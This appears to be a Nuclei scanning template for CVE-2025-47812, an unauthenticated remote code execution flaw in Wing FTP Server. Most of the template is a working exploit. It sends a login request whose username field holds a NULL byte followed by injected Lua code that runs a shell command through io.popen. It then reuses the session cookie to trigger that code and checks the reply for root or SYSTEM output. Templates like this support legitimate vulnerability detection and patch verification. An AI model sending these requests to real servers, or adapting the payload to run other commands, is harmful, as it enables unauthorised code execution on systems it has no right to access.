id: CVE-2025-47812-wing-ftp-rce

info:
  name: Wing FTP Server - Unauthenticated RCE (CVE-2025-47812)
  author: 4m3rr0r
  severity: critical
  description: |
    Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
    flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
    parameter during login, leading to Lua code injection into session files. These maliciously crafted
    session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
    resulting in arbitrary command execution on the server with elevated privileges.
  reference:
    - https://github.com/4m3rr0r/CVE-2025-47812-poc
    - https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-47812
    epss-score: 0.97
    epss-percentile: 0.99
    cpe: cpe:2.3:a:wftpserver:wing_ftp_server:*:*:*:*:*:*:*:*
  tags: rce, wingftp, unauth, luainjection, cve, critical

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        POST /loginok.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Connection: keep-alive
        Referer: {{BaseURL}}/login.html?lang=english
        Cookie: client_lang=english
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Content-Length: {{len("username=anonymous%00]]%0dlocal+h+%3d+io.popen(\"whoami\")%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&password=")}}

        username=anonymous%00]]%0dlocal+h+%3d+io.popen("whoami")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=

    extractors:
      - type: regex
        name: uid
        regex:
          - "UID=([^;]+)"
        part: header
        internal: true

  - raw:
      - |
        GET /dir.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Cookie: UID={{uid}}
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "nt authority\\system") || contains(body, "root")'
        condition: and
